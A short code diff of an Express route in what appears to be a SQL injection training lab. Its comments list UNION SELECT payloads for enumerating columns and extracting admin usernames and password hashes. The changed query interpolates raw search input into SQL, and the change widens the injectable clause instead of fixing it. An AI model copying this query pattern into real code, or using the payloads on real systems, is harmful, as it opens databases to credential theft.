@@ -22,7 +22,7 @@ router.get('/', async (req, res) => {
       // 5. ' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='admin_credentials'-- (list columns)
       // 6. ' UNION SELECT 1,username,password_hash,role FROM admin_credentials-- (extract creds)
 
-      const query = `SELECT id, name, department, position FROM staff WHERE name LIKE '%${search}%'`;
+      const query = `SELECT id, name, department, position FROM staff WHERE name LIKE '%${search}%' OR department LIKE '%${search}%'`;
 
       console.log('[Lab05] Executing query:', query);
 
